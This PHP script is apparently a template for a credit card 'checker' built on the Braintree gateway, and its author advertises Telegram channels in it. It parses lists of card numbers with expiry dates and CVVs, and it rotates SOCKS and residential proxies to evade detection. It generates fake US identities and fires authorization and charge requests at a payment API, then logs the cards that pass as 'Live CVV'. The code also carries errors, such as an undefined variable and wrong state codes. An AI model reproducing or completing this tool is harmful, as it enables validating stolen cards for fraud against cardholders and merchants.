<?php 
/// Link of the sit:[Enter your site link]/////
/// Made by 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁™】
/// Join @ZeltraxRockz & @ZeltraxChat for more...
/// This Braintree Raw API Made By 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁 ™】
require 'function.php';
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];
function zeltraxproxy()
{
  $proxySocks4 = file("zeltraxproxy.txt");
  $myproxy = rand(0, sizeof($proxySocks4) - 1);
  $proxySocks4 = $proxySocks4[$myproxy];
  return $proxySocks4;
}
$proxySocks4 = zeltraxproxy();
function saveCVV($cc) { 
    $file = dirname(FILE) . "/CVV Lives.txt";
    $fp = fopen($file, "a+"); 
    fwrite($fp, $cc . PHP_EOL); 
    fclose($fp); 
}
$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}
function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
////////////////////////////============[Randomizing Details Api]===============////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$name = value($resposta, '"first":"', '"');
$last = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
////////////////////////////==============[Luminati Details]==============////////////////
$username = 'username';
$password = 'password';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
////////////////////////////============[Authorizing Cards]===========///////////////////
$ch = curl_init();
//////////=======[LUMINATI]======////////////
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port"); //Comment this line if you don't have any account
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");//Comment this line if you don't have any account
//////////=======[Socks Proxy]=======/////////
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');


curl_setopt($ch, CURLOPT_URL, '............');


curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//========================================================================================================================//
//========================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, '........');
//// Short codes $cc $mon $year $cvv $name $last $street $zip $phone $state $email/////////////////////
//========================================================================================================================//
//========================================================================================================================//
$headers = array();

$headers[] = 'Accept: ...................';

$headers[] = 'Authorization: ............';

$headers[] = 'Accept-language: ..........';

$headers[] = 'Braintree-version: ........';

$headers[] = 'Content-Type: .............';

$headers[] = 'Origin: ...................';

$headers[] = 'Referer: ..................';

$headers[] = 'Sec-Fetch-Mode: cors';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"token":"','"')));
////////////////////////////===============[For Charging Cards]=============////////////////////////
$ch = curl_init();
//////////=======[LUMINATI]======////////////
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port"); //Comment this line if you don't have any account
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");//Comment this line if you don't have any account
//////////=======[Socks Proxy]=======/////////
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');


curl_setopt($ch, CURLOPT_URL, '.........');


curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//========================================================================================================================//
//========================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, '........');
//// Short codes $cc $mon $year $cvv $name $last $street $zip $phone $state $email/////////////////////
//========================================================================================================================//
//========================================================================================================================//
$headers = array();

$headers[] = 'Accept: ................';

$headers[] = 'Authorization: .........';

$headers[] = 'Host: ..................';

$headers[] = 'Content-Type: ..........';

$headers[] = 'Origin: ................';

$headers[] = 'Referer: ...............';

$headers[] = 'Sec-Fetch-Mode: cors';

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"cvv_result":{"code":"','"')));
$avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','"')));
//////////////////////////////////==============[Card Response Start]================///////////////////////////////////////
if(strpos($result, 'M')){saveCVV ("Live CVV -> $cc|$mon|$year|$cvv|$name | Checker Made By 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁™】");
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ⍋</i></font><font class='badge badge-danger'> $cc|$mon|$year|$cvv </font><font size=2 color='green'><font class='badge badge-success'>Authorized [CVV-$message/AVS-$avs]</i></font><br>";
} 
else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font><font class='badge badge-danger'> $cc|$mon|$year|$cvv </font><font size=2 color='red'><font class='badge badge-danger'>Declined [CVV-$message/AVS-$avs]</i></font><br>";
}
curl_close($ch);
ob_flush();
/////////////////==========Braintree Raw API Made By 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁 ™】===========//////////////////
////////////////==============Join @ZeltraxRockz & @ZeltraxChat for more==============///////////////////////
?>